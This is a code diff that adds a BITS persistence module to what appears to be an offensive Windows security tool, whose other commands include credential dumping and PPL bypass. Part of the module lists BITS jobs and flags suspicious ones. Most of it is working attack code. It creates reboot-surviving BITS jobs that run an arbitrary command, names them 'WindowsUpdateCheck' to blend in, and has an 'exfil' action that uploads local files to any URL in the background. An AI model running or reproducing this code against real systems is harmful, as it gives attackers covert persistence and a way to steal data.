@@ -20791,6 +20791,235 @@ Write-Output "[!] Note: RunAsPPL change requires REBOOT to take effect"
   return { output: output.join("\n"), findings }
 }
 
+async function bitsPersist(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "list"
+  const name = argVal(args, "--name") || "WindowsUpdateCheck"
+  const url = argVal(args, "--url")
+  const command = argVal(args, "--command")
+  const localFile = argVal(args, "--local-file")
+  const interval = argVal(args, "--interval") || "60"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] BITS persistence operations...\n"]
+
+  if (action === "list") {
+    const script = `
+Write-Output "=== BITS Transfer Jobs ==="
+
+# List all BITS jobs (requires admin for other users' jobs)
+$jobs = Get-BitsTransfer -AllUsers -ErrorAction SilentlyContinue
+if (-not $jobs) {
+  $jobs = Get-BitsTransfer -ErrorAction SilentlyContinue
+}
+
+if ($jobs) {
+  $count = ($jobs | Measure-Object).Count
+  Write-Output "JOBS_COUNT=$count"
+  Write-Output ""
+  foreach ($job in $jobs) {
+    Write-Output "--- Job: $($job.DisplayName) ---"
+    Write-Output "  JobId: $($job.JobId)"
+    Write-Output "  Owner: $($job.OwnerAccount)"
+    Write-Output "  State: $($job.JobState)"
+    Write-Output "  Type: $($job.TransferType)"
+    Write-Output "  Priority: $($job.Priority)"
+    Write-Output "  Created: $($job.CreationTime)"
+    Write-Output "  Modified: $($job.ModificationTime)"
+    Write-Output "  BytesTransferred: $($job.BytesTransferred)"
+    Write-Output "  BytesTotal: $($job.BytesTotal)"
+    # Check for notification command (persistence indicator)
+    $cmdLine = $job.NotifyCmdLine
+    if ($cmdLine) {
+      Write-Output "  [!] NotifyCmdLine: $cmdLine"
+      Write-Output "  SUSPICIOUS=1"
+    }
+    Write-Output ""
+  }
+} else {
+  Write-Output "No BITS jobs found"
+  Write-Output "JOBS_COUNT=0"
+}
+
+# Check BITS service status
+Write-Output "=== BITS Service ==="
+$svc = Get-Service BITS
+Write-Output "Status: $($svc.Status)"
+Write-Output "StartType: $($svc.StartType)"
+
+# Registry persistence check
+$bitsReg = Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\BITS' -ErrorAction SilentlyContinue
+if ($bitsReg) {
+  Write-Output "MaxBandwidth: $($bitsReg.MaxBandwidthServed)"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+
+    const countMatch = r.stdout.match(/JOBS_COUNT=(\d+)/)
+    const hasSuspicious = r.stdout.includes("SUSPICIOUS=1")
+    if (hasSuspicious) {
+      findings.push({
+        checkId: "WIN-BITS-001",
+        provider: "windows",
+        severity: "high",
+        status: "SUSPICIOUS",
+        resource: "bits://jobs",
+        title: "BITS job with NotifyCmdLine found — possible persistence",
+        details: "A BITS transfer job has a notification command configured, which executes when the job completes. This is a known persistence technique.",
+        remediation: "Review and remove suspicious BITS jobs: Get-BitsTransfer -AllUsers | Remove-BitsTransfer",
+      })
+    }
+  }
+
+  if (action === "create") {
+    if (!command) {
+      output.push("ERROR: --command required for create action")
+      return { output: output.join("\n"), findings }
+    }
+    const downloadUrl = url || "https://live.sysinternals.com/autoruns.exe"
+    const localPath = localFile || "$env:TEMP\\update-check.tmp"
+    const script = `
+Write-Output "=== Creating BITS Persistence Job ==="
+Write-Output "Name: ${name}"
+Write-Output "Command: ${command}"
+Write-Output ""
+
+# Method 1: BITS job with NotifyCmdLine (survives reboots with BG_JOB_ENABLE_PERF_CACHING)
+try {
+  # Create download job (needs a valid URL to trigger completion)
+  $job = Start-BitsTransfer -DisplayName '${name}' -Source '${downloadUrl}' -Destination '${localPath}' -Asynchronous -Priority Low
+
+  # Set notification command to execute on completion
+  # Uses COM interface for NotifyCmdLine
+  $jobObj = [System.Runtime.InteropServices.Marshal]::CreateWrapperOfType($job, [Microsoft.BackgroundIntelligentTransfer.Management.BitsJob])
+
+  Write-Output "[*] Job created: $($job.JobId)"
+  Write-Output "[*] State: $($job.JobState)"
+  Write-Output ""
+
+  # Alternative: bitsadmin for notification command (more reliable)
+  $jobId = $job.JobId
+  bitsadmin /setnotifycmdline "{$jobId}" "${command.split(" ")[0]}" "${command}" 2>&1 | Out-Null
+  bitsadmin /setnotifyflags "{$jobId}" 1 2>&1 | Out-Null
+  bitsadmin /setminretrydelay "{$jobId}" ${parseInt(interval) * 60} 2>&1 | Out-Null
+  bitsadmin /setnoprogresstimeout "{$jobId}" 0 2>&1 | Out-Null
+  bitsadmin /resume "{$jobId}" 2>&1 | Out-Null
+
+  Write-Output "[+] Persistence configured:"
+  Write-Output "    Job: ${name} ($jobId)"
+  Write-Output "    Trigger: On transfer completion/error"
+  Write-Output "    Command: ${command}"
+  Write-Output "    Retry: Every ${interval} minutes"
+  Write-Output ""
+  Write-Output "[*] Job will persist across reboots"
+  Write-Output "[*] BITS service auto-starts on boot (Automatic trigger)"
+  Write-Output ""
+  Write-Output "Cleanup: winhook bits_persist --action delete --name '${name}'"
+  Write-Output "STATUS=SUCCESS"
+} catch {
+  Write-Output "[-] PowerShell method failed: $_"
+  Write-Output ""
+  Write-Output "[*] Falling back to bitsadmin..."
+
+  bitsadmin /create /download "${name}" 2>&1
+  bitsadmin /addfile "${name}" "${downloadUrl}" "${localPath}" 2>&1
+  bitsadmin /setnotifycmdline "${name}" "${command.split(" ")[0]}" "${command}" 2>&1
+  bitsadmin /setnotifyflags "${name}" 1 2>&1
+  bitsadmin /setminretrydelay "${name}" ${parseInt(interval) * 60} 2>&1
+  bitsadmin /setnoprogresstimeout "${name}" 0 2>&1
+  bitsadmin /resume "${name}" 2>&1
+
+  Write-Output ""
+  Write-Output "[+] BITS job created via bitsadmin"
+  Write-Output "STATUS=SUCCESS"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+
+    if (r.stdout.includes("STATUS=SUCCESS")) {
+      findings.push({
+        checkId: "WIN-BITS-010",
+        provider: "windows",
+        severity: "critical",
+        status: "PERSISTED",
+        resource: `bits://${name}`,
+        title: `BITS persistence job created: ${name}`,
+        details: `Command: ${command}, retry interval: ${interval} minutes. Job persists across reboots via BITS service auto-start.`,
+        remediation: `Remove: winhook bits_persist --action delete --name '${name}'`,
+      })
+    }
+  }
+
+  if (action === "delete") {
+    const script = `
+Write-Output "=== Removing BITS Job ==="
+
+# Try PowerShell first
+$job = Get-BitsTransfer -AllUsers -ErrorAction SilentlyContinue | Where-Object { $_.DisplayName -eq '${name}' }
+if ($job) {
+  $job | Remove-BitsTransfer
+  Write-Output "[+] Removed BITS job: ${name} ($($job.JobId))"
+} else {
+  # Try bitsadmin
+  $result = bitsadmin /cancel "${name}" 2>&1
+  if ($LASTEXITCODE -eq 0) {
+    Write-Output "[+] Removed BITS job via bitsadmin: ${name}"
+  } else {
+    Write-Output "[-] Job '${name}' not found"
+  }
+}
+
+# Clean up local file
+if (Test-Path '${localFile || "$env:TEMP\\update-check.tmp"}') {
+  Remove-Item '${localFile || "$env:TEMP\\update-check.tmp"}' -Force
+  Write-Output "[+] Cleaned up local file"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+  }
+
+  if (action === "exfil") {
+    if (!url) {
+      output.push("ERROR: --url required for exfil action (upload endpoint)")
+      return { output: output.join("\n"), findings }
+    }
+    if (!localFile) {
+      output.push("ERROR: --local-file required for exfil action")
+      return { output: output.join("\n"), findings }
+    }
+    const script = `
+Write-Output "=== BITS Data Exfiltration ==="
+Write-Output "Source: ${localFile}"
+Write-Output "Destination: ${url}"
+Write-Output ""
+
+try {
+  # Upload job — BITS handles chunking, retry, and bandwidth throttling
+  Start-BitsTransfer -Source '${localFile}' -Destination '${url}' -TransferType Upload -DisplayName '${name}-exfil' -Priority Low -Asynchronous
+  Write-Output "[+] Upload job created"
+  Write-Output "[*] BITS handles retry and bandwidth throttling automatically"
+  Write-Output "[*] Transfer runs in background even if session disconnects"
+  Write-Output ""
+  Write-Output "[*] Monitor: bitsadmin /info '${name}-exfil' /verbose"
+  Write-Output "STATUS=STARTED"
+} catch {
+  Write-Output "[-] Upload failed: $_"
+  Write-Output ""
+  Write-Output "[*] Alternative: Use bitsadmin"
+  Write-Output "    bitsadmin /create /upload ${name}-exfil"
+  Write-Output "    bitsadmin /addfile ${name}-exfil ${url} ${localFile}"
+  Write-Output "    bitsadmin /resume ${name}-exfil"
+  Write-Output "STATUS=FAILED"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 // ── Dispatch ──
 
 async function privilegeAbuse(args: string[], timeout: number): Promise<HookResult> {
@@ -24421,6 +24650,7 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   win_hello_dump: winHelloDump,
   exchange_abuse: exchangeAbuse,
   ppl_bypass: pplBypass,
+  bits_persist: bitsPersist,
 }
 
 export const WinhookTool = Tool.define("winhook", {
